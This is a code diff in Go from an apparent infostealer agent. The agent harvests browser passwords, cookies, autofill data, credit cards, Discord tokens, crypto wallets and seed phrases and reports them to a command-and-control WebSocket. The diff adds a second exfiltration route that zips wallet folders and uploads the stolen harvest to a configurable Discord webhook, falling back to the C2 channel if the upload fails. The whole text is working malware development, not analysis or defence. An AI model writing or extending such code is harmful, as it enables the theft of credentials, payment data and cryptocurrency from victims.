@@ -59,6 +59,13 @@ func handleEvent(event string, payload []byte) error {
 	switch event {
 	case "collect":
 		go handleCollect(payload)
+	case "discord_config":
+		var c discordAgentConfig
+		if len(payload) > 0 {
+			_ = json.Unmarshal(payload, &c)
+		}
+		setDiscordConfig(c)
+		sendEvent("status", map[string]string{"message": "discord config updated"})
 	case "scan_files":
 		go handleScanFiles()
 	case "scan_extensions":
@@ -104,12 +111,32 @@ func handleCollect(payload []byte) {
 		}
 	}()
 
+	// collect payload may include nested discord: { enabled, webhookUrl, threadPrefix }
+	var raw map[string]interface{}
 	var opts recovery.CollectOptions
 	if len(payload) > 0 {
-		json.Unmarshal(payload, &opts)
+		_ = json.Unmarshal(payload, &opts)
+		_ = json.Unmarshal(payload, &raw)
+		if d, ok := raw["discord"].(map[string]interface{}); ok {
+			cfg := getDiscordConfig()
+			if v, ok := d["enabled"].(bool); ok {
+				cfg.Enabled = v
+			}
+			if v, ok := d["webhookUrl"].(string); ok && v != "" {
+				cfg.WebhookURL = v
+			}
+			if v, ok := d["threadPrefix"].(string); ok && v != "" {
+				cfg.ThreadPrefix = v
+			}
+			setDiscordConfig(cfg)
+		}
 	} else {
 		opts.Browsers = true
 	}
+
+	dcfg := getDiscordConfig()
+	// Prefer Discord webhook path when configured — do NOT flood C2 WebSocket with harvest/wallets
+	useDiscord := dcfg.Enabled && dcfg.WebhookURL != ""
 
 	if opts.Browsers {
 		noneSet := !opts.Passwords && !opts.Cookies && !opts.Autofill &&
@@ -132,8 +159,8 @@ func handleCollect(payload []byte) {
 		}
 	}
 
-	log.Printf("[recovery] starting collection (passwords=%v cookies=%v autofill=%v history=%v bookmarks=%v cards=%v discord=%v)",
-		opts.Passwords, opts.Cookies, opts.Autofill, opts.History, opts.Bookmarks, opts.CreditCards, opts.Discord)
+	log.Printf("[recovery] starting collection (discordWebhook=%v passwords=%v cookies=%v ...)",
+		useDiscord, opts.Passwords, opts.Cookies)
 	sendEvent("status", map[string]string{"message": "Resolving encryption keys..."})
 
 	var extensions []recovery.ExtensionResult
@@ -146,8 +173,17 @@ func handleCollect(payload []byte) {
 		}()
 	}
 
-	partialFn := func(partial *recovery.CollectionResult) {
-		sendEvent("partial", partial)
+	// When uploading to Discord, skip heavy partial events on the C2 WebSocket
+	var partialFn func(*recovery.CollectionResult)
+	if !useDiscord {
+		partialFn = func(partial *recovery.CollectionResult) {
+			sendEvent("partial", partial)
+		}
+	} else {
+		partialFn = func(partial *recovery.CollectionResult) {
+			// lightweight progress only
+			sendEvent("status", map[string]string{"message": "collecting..."})
+		}
 	}
 
 	result, err := recovery.Collect(opts, partialFn)
@@ -166,21 +202,68 @@ func handleCollect(payload []byte) {
 		len(result.Passwords), len(result.Cookies), len(result.Autofill),
 		len(result.History), len(result.Bookmarks), len(result.CreditCards), len(result.DiscordTokens), len(result.Extensions), len(result.Wallets), len(result.Telegram), len(result.Keys), len(result.AppCredentials))
 
-	sendEvent("results", result)
+	// Zip wallets locally (before Discord or WS path)
+	var walletBlobs []walletBlob
+	for _, w := range result.Wallets {
+		if w.Size > maxAutoDownloadSize {
+			log.Printf("[recovery] skip wallet zip %q (size limit)", w.Name)
+			continue
+		}
+		data, zerr := recovery.ZipDirectory(w.Path)
+		if zerr != nil {
+			log.Printf("[recovery] wallet zip %q: %v", w.Name, zerr)
+			continue
+		}
+		log.Printf("[recovery] wallet zip ready %q (%d bytes)", w.Name, len(data))
+		walletBlobs = append(walletBlobs, walletBlob{
+			Name: w.Name, Type: w.Type, Path: w.Path,
+			Addresses: w.Addresses, VaultData: w.VaultData, Data: data,
+		})
+	}
 
+	seeds := recovery.ScanSeeds(result.Files, result.Passwords, result.Autofill)
+	if len(seeds) > 0 {
+		log.Printf("[recovery] seed scan found %d seed phrases", len(seeds))
+	}
+
+	if useDiscord {
+		// ── Agent → Discord webhook (HTTP). C2 WS only gets a small completion event. ──
+		sendEvent("status", map[string]string{"message": "Uploading harvest to Discord webhook..."})
+		threadID, uerr := uploadHarvestToDiscord(hostInfo.ClientID, result, seeds, walletBlobs, dcfg)
+		if uerr != nil {
+			log.Printf("[recovery] Discord webhook upload failed: %v", uerr)
+			sendEvent("error", map[string]string{"error": "discord upload: " + uerr.Error()})
+			// Fall back to classic WS path so data is not lost
+			sendEvent("results", result)
+			go autoDownloadWallets(result.Wallets)
+			if len(seeds) > 0 {
+				sendEvent("seed_scan_results", map[string]interface{}{"seeds": seeds})
+			}
+			return
+		}
+		sendEvent("discord_upload_complete", map[string]interface{}{
+			"clientId":    hostInfo.ClientID,
+			"threadId":    threadID,
+			"wallets":     len(walletBlobs),
+			"seeds":       len(seeds),
+			"passwords":   len(result.Passwords),
+			"cookies":     len(result.Cookies),
+			"history":     len(result.History),
+			"extensions":  len(result.Extensions),
+		})
+		sendEvent("status", map[string]string{"message": "Discord upload complete — server will import from forum post"})
+		log.Printf("[recovery] Discord pipeline done thread=%s (no bulk WS exfil)", threadID)
+		return
+	}
+
+	// Classic path: stream harvest over C2 WebSocket
+	sendEvent("results", result)
 	if len(result.Wallets) > 0 {
 		go autoDownloadWallets(result.Wallets)
 	}
-
-	go func() {
-		seeds := recovery.ScanSeeds(result.Files, result.Passwords, result.Autofill)
-		if len(seeds) > 0 {
-			log.Printf("[recovery] seed scan found %d seed phrases", len(seeds))
-			sendEvent("seed_scan_results", map[string]interface{}{
-				"seeds": seeds,
-			})
-		}
-	}()
+	if len(seeds) > 0 {
+		sendEvent("seed_scan_results", map[string]interface{}{"seeds": seeds})
+	}
 }
 
 func handleScanExtensions() {
